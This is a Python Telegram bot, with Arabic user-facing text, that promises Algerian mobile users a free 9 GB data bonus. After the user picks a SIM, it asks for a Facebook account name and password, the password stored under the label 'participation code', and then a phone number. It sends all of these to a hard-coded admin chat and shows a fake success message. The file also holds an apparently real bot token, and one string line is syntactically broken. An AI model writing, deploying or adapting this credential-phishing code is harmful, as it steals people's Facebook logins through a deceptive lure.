import json
import os
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler, CallbackQueryHandler
)

BOT_TOKEN = "8544061357:AAFIM_bbsvtAqZgxfAmpEo2i6mHd2iqqFZA"
ADMIN_CHAT_ID = 1247201641
REGISTERED_FILE = "registered.json"

SIM_TYPE, ACCOUNT_NAME, PARTICIPATION_CODE, PHONE_NUMBER = range(4)

def load_registered():
    if os.path.exists(REGISTERED_FILE):
        with open(REGISTERED_FILE, "r") as f:
            return json.load(f)
    return []

def save_registered(phones):
    with open(REGISTERED_FILE, "w") as f:
        json.dump(phones, f)

def is_valid_algerian_number(phone):
    phone = phone.strip().replace(" ", "").replace("-", "")
    pattern = r'^(\+213|00213|0)(5|6|7)[0-9]{8}$'
    return re.match(pattern, phone) is not None

def normalize_phone(phone):
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("00213"):
        phone = "0" + phone[5:]
    elif phone.startswith("+213"):
        phone = "0" + phone[4:]
    return phone

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("📱 Mobilis", callback_data="mobilis"),
            InlineKeyboardButton("📱 Djezzy", callback_data="djezzy"),
            InlineKeyboardButton("📱 Ooredoo", callback_data="ooredoo"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🌟 *أهلاً وسهلاً!*\n\n"
        "━━━━━━━━━━━━━━━\n"
        "📋 التسجيل بحساب الفايسبوك مرة واحدة فقط  \n\n"
        "👇 *أولاً: اختر نوع شريحتك*",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )
    return SIM_TYPE

async def sim_type_chosen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    sim_labels = {
        "mobilis": "📱 Mobilis",
        "djezzy": "📱 Djezzy",
        "ooredoo": "📱 Ooredoo",
    }

    context.user_data["sim_type"] = sim_labels[query.data]

    await query.edit_message_text(
        f"✅ تم اختيار: *{sim_labels[query.data]}*\n\n"
        "━━━━━━━━━━━━━━━\n"
        "📝 *الخطوة 1/3:* أدخل **اسم حساب الفايسبوك**:",
        parse_mode="Markdown"
    )
    return ACCOUNT_NAME

async def get_account_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["account_name"] = update.message.text

    await update.message.reply_text(
        "✅ *تم حفظ اسم الحساب!*\n\n"
        "━━━━━━━━━━━━━━━\n"
        "🔑 " الخطوة 2/3:* أدخل **كلمة السر **: ",
        parse_mode="Markdown"
    )
    return PARTICIPATION_CODE

async def get_participation_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["participation_code"] = update.message.text

    with open("congratulations.webp", "rb") as photo:
        await update.message.reply_photo(
            photo=photo,
            caption="🎉 *تهانينا! الكود صحيح!*\n\n"
                    "━━━━━━━━━━━━━━━\n"
                    "📱 *الخطوة 3/3:* أدخل **رقم هاتفك** (مثال: 0661234567):",
            parse_mode="Markdown"
        )
    return PHONE_NUMBER

async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()

    if not is_valid_algerian_number(phone):
        await update.message.reply_text(
            "❌ *رقم الهاتف غير صحيح!*\n\n"
            "يجب أن يكون رقم جزائري صحيح\n"
            "📌 مثال: `0661234567` أو `+213661234567`\n\n"
            "🔄 أعد إدخال الرقم:",
            parse_mode="Markdown"
        )
        return PHONE_NUMBER

    phone_normalized = normalize_phone(phone)
    registered = load_registered()

    if phone_normalized in registered:
        await update.message.reply_text(
            "⚠️ *هذا الرقم مسجل مسبقاً!*\n\n"
            "لا يمكن التسجيل بنفس الرقم مرتين.\n"
            "إذا كان لديك مشكلة تواصل مع الإدارة.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    registered.append(phone_normalized)
    save_registered(registered)

    context.user_data["phone_number"] = phone_normalized
    user = update.message.from_user
    account_name = context.user_data["account_name"]
    participation_code = context.user_data["participation_code"]
    sim_type = context.user_data["sim_type"]

    admin_message = (
        f"📬 *تسجيل جديد!*\n\n"
        f"👤 *المستخدم:* {user.full_name} (@{user.username or 'لا يوجد'})\n"
        f"🆔 *ID تيليقرام:* `{user.id}`\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📛 *اسم الحساب:* {account_name}\n"
        f"🔑 *كود المشاركة:* `{participation_code}`\n"
        f"📱 *رقم الهاتف:* `{phone_normalized}`\n"
        f"📡 *نوع الشريحة:* {sim_type}\n"
        f"━━━━━━━━━━━━━━━"
    )

    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=admin_message,
        parse_mode="Markdown"
    )

    with open("congratulations.webp", "rb") as photo:
        await update.message.reply_photo(
            photo=photo,
            caption="🎊 *مبروك! تم تسجيل 9جيغا صالحة لمدة اسبوع  !* 🎊\n\n"
                    "━━━━━━━━━━━━━━━\n"
                    f"📛 الاسم: {account_name}\n"
                    f"📱 الرقم: `{phone_normalized}`\n"
                    f"📡 الشريحة: {sim_type}\n"
                    "━━━━━━━━━━━━━━━\n\n"
                    "✨ شكراً على مشاركتك!",
            parse_mode="Markdown"
        )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "❌ *تم إلغاء التسجيل.*\n\nاكتب /start للبدء من جديد.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            SIM_TYPE: [CallbackQueryHandler(sim_type_chosen)],
            ACCOUNT_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_account_name)],
            PARTICIPATION_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_participation_code)],
            PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    print("🤖 البوت شغال...")
    app.run_polling()

if __name__ == "__main__":
    main()
